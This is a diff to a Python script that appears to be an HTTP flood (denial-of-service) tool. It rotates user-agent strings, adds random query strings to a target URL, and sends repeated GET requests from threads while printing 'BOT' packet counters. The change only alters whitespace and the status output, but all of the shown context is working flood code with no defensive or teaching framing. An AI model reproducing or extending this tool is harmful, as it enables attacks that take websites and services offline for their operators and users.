@@ -56,19 +56,15 @@ def useragent():
     headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
     headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
     headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
-
     return headers
-
 
 def genstr(size):
     out_str = ''
-
     for _ in range(0, size):
         code = random.randint(65, 90)
         out_str += chr(code)
     
     return out_str
-
 
 class httpth1(threading.Thread):
     def run(self):
@@ -79,8 +75,8 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("\033[48;5;1m\033[37m" +str(u)+ " \033[0m\033[36mInfo target:") 
-                print("\033[33m " +str(url)+ " \033[32mWorking\033[0m")     
+                print("\033[48;5;1m\033[37m" +str(u)+ " \033[0m\033[36mrequests:") 
+                print("\033[33m " +(randomized_url)+ " \033[32mWorking\033[0m")     
             except requests.exceptions.ConnectionError:
                 print("[*]  \033[1mBOT --> \033[1m " +str(u)+ "   \033[97mSend the packet  \033[35m " +url+ "\033[0m" )
                 pass
